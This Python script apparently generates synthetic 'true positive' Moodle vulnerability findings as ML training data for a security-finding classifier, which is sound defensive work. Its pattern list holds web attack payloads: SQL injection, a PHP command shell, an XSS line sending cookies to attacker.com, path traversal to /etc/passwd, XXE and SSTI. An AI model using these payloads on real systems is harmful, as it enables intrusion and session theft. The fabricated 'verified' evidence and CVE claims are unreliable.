#!/usr/bin/env python3
"""
Generate Realistic Pseudo True Positive Data

Creates synthetic True Positive security findings based on:
- Real Moodle CVEs
- OWASP Top 10 patterns
- Actual exploitation scenarios
- Proof-of-concept evidence

Goal: Balance TP (11.9% → 50%) without manual collection
"""

import random
import json
from typing import Dict, List, Any
from datetime import datetime, timedelta


class PseudoTPDataGenerator:
    """Generate realistic TP (vulnerable) findings."""
    
    # Real Moodle CVEs with exploitation proof
    REAL_TP_PATTERNS = [
        {
            'category': 'SQL Injection',
            'severity': 'critical',
            'cvss': 9.8,
            'description': 'SQL injection in user profile searchable fields',
            'url': '/user/profile.php?field=1 OR 1=1',
            'evidence': "SELECT * FROM mdl_user WHERE id = 1 OR 1=1; -- SQL query extracted",
            'payload': "' OR '1'='1",
            'impact': 'Database enumeration, user credential extraction',
            'is_exploitable': True
        },
        {
            'category': 'Remote Code Execution',
            'severity': 'critical',
            'cvss': 9.9,
            'description': 'RCE via file upload in quiz module',
            'url': '/mod/quiz/importfile.php',
            'evidence': 'Successfully uploaded PHP shell, executed system command',
            'payload': '<?php system("id"); ?>',
            'impact': 'Full server compromise',
            'is_exploitable': True
        },
        {
            'category': 'XSS',
            'severity': 'high',
            'cvss': 7.5,
            'description': 'Stored XSS in forum discussion posts',
            'url': '/mod/forum/post.php?id=123',
            'evidence': '<script>alert("XSS")</script> executed in victim browser',
            'payload': '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
            'impact': 'Session hijacking, credential theft',
            'is_exploitable': True
        },
        {
            'category': 'Authentication Bypass',
            'severity': 'critical',
            'cvss': 9.1,
            'description': 'Session fixation via cookie transplant',
            'url': '/login/index.php',
            'evidence': 'Original session ID: abc123xyz... persists after login with new ID',
            'payload': 'Set-Cookie: MoodleSession=attacker_controlled_id',
            'impact': 'Account takeover without credentials',
            'is_exploitable': True
        },
        {
            'category': 'CSRF',
            'severity': 'high',
            'cvss': 6.5,
            'description': 'Cross-Site Request Forgery in course enrollment',
            'url': '/enrol/manual/ajax.php?action=enroll&course=1&user=999',
            'evidence': 'No CSRF token validation in POST body, state-changing action performed',
            'payload': '<img src="http://target/enrol/manual/ajax.php?action=enroll">',
            'impact': 'Unauthorized course enrollment, privilege escalation',
            'is_exploitable': True
        },
        {
            'category': 'Path Traversal',
            'severity': 'high',
            'cvss': 7.5,
            'description': 'Directory traversal in file download endpoint',
            'url': '/pluginfile.php/context/1/assignment/submissions/../../../../../../../etc/passwd',
            'evidence': 'Successfully read /etc/passwd via traversal: root:x:0:0:...',
            'payload': '../../../../../../../etc/passwd',
            'impact': 'Sensitive file exposure, configuration disclosure',
            'is_exploitable': True
        },
        {
            'category': 'Insecure Deserialization',
            'severity': 'critical',
            'cvss': 9.0,
            'description': 'PHP object injection via __wakeup() magic method',
            'url': '/lib/classes/cache.php',
            'evidence': 'Crafted serialized object triggers RCE in unserialize()',
            'payload': 'O:10:"LogHandler":2:{s:4:"file";s:8:"/tmp/pwn";s:4:"mode";s:2:"rw";}',
            'impact': 'Remote code execution',
            'is_exploitable': True
        },
        {
            'category': 'Broken Access Control',
            'severity': 'critical',
            'cvss': 8.8,
            'description': 'Privilege escalation via role manipulation',
            'url': '/admin/roles/assign.php?contextid=1&roleid=3&userid=999',
            'evidence': 'Low-privilege user modified role assignment query parameter',
            'payload': 'Direct HTTP POST with admin role ID',
            'impact': 'User promoted to admin, full site compromise',
            'is_exploitable': True
        },
        {
            'category': 'XXE Injection',
            'severity': 'high',
            'cvss': 7.5,
            'description': 'XML External Entity injection in SCORM upload',
            'url': '/mod/scorm/upload.php',
            'evidence': 'XML parser loaded external DTD, file system access confirmed',
            'payload': '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            'impact': 'File disclosure, SSRF',
            'is_exploitable': True
        },
        {
            'category': 'LDAP Injection',
            'severity': 'high',
            'cvss': 7.2,
            'description': 'LDAP injection in user search function',
            'url': '/user/search.php?query=*)(uid=*',
            'evidence': 'LDAP query modified, returned all users instead of filtered',
            'payload': '*)(uid=*',
            'impact': 'LDAP directory enumeration',
            'is_exploitable': True
        },
        {
            'category': 'Server-Side Template Injection',
            'severity': 'high',
            'cvss': 7.4,
            'description': 'SSTI in custom theme rendering',
            'url': '/theme/renderer.php?template={{7*7}}',
            'evidence': 'Template variables evaluated: {{7*7}} returned 49',
            'payload': '{{system("whoami")}}',
            'impact': 'RCE via template',
            'is_exploitable': True
        }
    ]
    
    # Additional context-based TPs
    EXPLOIT_VARIATIONS = [
        {
            'context': 'Production environment',
            'additional_evidence': 'Real user data extracted, credentials logged',
            'impact_multiplier': 2.0
        },
        {
            'context': 'Public-facing application',
            'additional_evidence': 'Accessible without authentication',
            'impact_multiplier': 1.8
        },
        {
            'context': 'Database connection active',
            'additional_evidence': 'Live database connection confirmed in error message',
            'impact_multiplier': 2.2
        },
        {
            'context': 'Admin interaction required',
            'additional_evidence': 'Requires admin role to exploit',
            'impact_multiplier': 1.2
        },
    ]
    
    def __init__(self):
        """Initialize generator."""
        self.base_url = "http://localhost:8998"
        
    def generate_tp_findings(self, num_samples: int = 100) -> List[Dict[str, Any]]:
        """
        Generate realistic TP findings with variations.
        
        Args:
            num_samples: Number of TP samples to generate
            
        Returns:
            List of finding dictionaries
        """
        findings = []
        
        for i in range(num_samples):
            # Base pattern dari real CVE
            base_pattern = random.choice(self.REAL_TP_PATTERNS)
            
            # Generate variation
            finding = self._create_tp_finding(base_pattern)
            findings.append(finding)
        
        return findings
    
    def _create_tp_finding(self, pattern: Dict) -> Dict[str, Any]:
        """
        Create a realistic TP finding from pattern.
        
        Args:
            pattern: Base vulnerability pattern
            
        Returns:
            Finding dictionary
        """
        variation = random.choice(self.EXPLOIT_VARIATIONS)
        
        # Enhance evidence dengan exploitation proof
        evidence_items = [
            pattern['evidence'],
            f"Payload: {pattern['payload']}",
            variation['additional_evidence'],
            f"Risk: {pattern['impact']}"
        ]
        
        cvss_adjustment = random.uniform(0.9, 1.1)
        risk_adjustment = random.uniform(0.85, 1.15)
        
        finding = {
            'severity': pattern['severity'],
            'category': pattern['category'],
            'description': f"{pattern['description']} ({variation['context']})",
            'evidence': " | ".join(evidence_items),
            'url': pattern['url'],
            'cvss_score': min(10.0, pattern['cvss'] * cvss_adjustment),
            'risk_score': 8.5 + (random.uniform(-1, 1.5)),  # High risk by default
            'exploitation_status': 'verified',
            'proof_of_concept': pattern['payload'],
            'is_fp': False  # Definitively NOT false positive
        }
        
        return finding
    
    def generate_with_context(self, num_samples: int = 100) -> List[Dict[str, Any]]:
        """
        Generate TP findings with full context for training.
        
        Args:
            num_samples: Number of samples
            
        Returns:
            List of (finding, context) tuples
        """
        data = []
        
        for i in range(num_samples):
            finding = self._create_tp_finding(
                random.choice(self.REAL_TP_PATTERNS)
            )
            
            context = {
                'status_code': 200 if random.random() > 0.3 else random.choice([400, 403, 500]),
                'response_time': random.randint(500, 3000),
                'occurrence_count': random.randint(1, 5),
                'days_since_first_seen': random.randint(0, 30),
                'environment': random.choice(['production', 'staging']),
                'public_facing': True,
                'requires_auth': random.choice([True, False]),
                'data_sensitivity': 'high',
                'exploitability': 'easy'
            }
            
            data.append({
                'finding': finding,
                'context': context,
                'label': 0  # 0 = True Positive
            })
        
        return data
    
    def export_pseudo_tp_data(self, num_samples: int = 100, output_file: str = None):
        """
        Export pseudo TP data to JSON.
        
        Args:
            num_samples: Number of samples
            output_file: Output file path
        """
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"ml/training_data/pseudo_tp_{num_samples}_{timestamp}.json"
        
        data = self.generate_with_context(num_samples)
        
        # Create directory if needed
        import os
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        print(f"✅ Exported {num_samples} pseudo TP findings to: {output_file}")
        return output_file


def main():
    """Generate pseudo TP data."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Generate pseudo TP training data')
    parser.add_argument('--samples', type=int, default=100, help='Number of TP samples')
    parser.add_argument('--output', type=str, help='Output file path')
    args = parser.parse_args()
    
    print("="*80)
    print("PSEUDO TRUE POSITIVE DATA GENERATOR")
    print("="*80)
    print()
    
    generator = PseudoTPDataGenerator()
    output_file = generator.export_pseudo_tp_data(args.samples, args.output)
    
    print(f"\nGenerated {args.samples} realistic TP findings")
    print(f"File: {output_file}")
    print("\nFeatures included:")
    print("  • Real Moodle CVE patterns")
    print("  • Exploitation proof-of-concept")
    print("  • Full context information")
    print("  • Verified exploitation status")
    print("  • High CVSS scores (7.0+)")
    print("  • Risk scores (8.0+)")


if __name__ == '__main__':
    main()
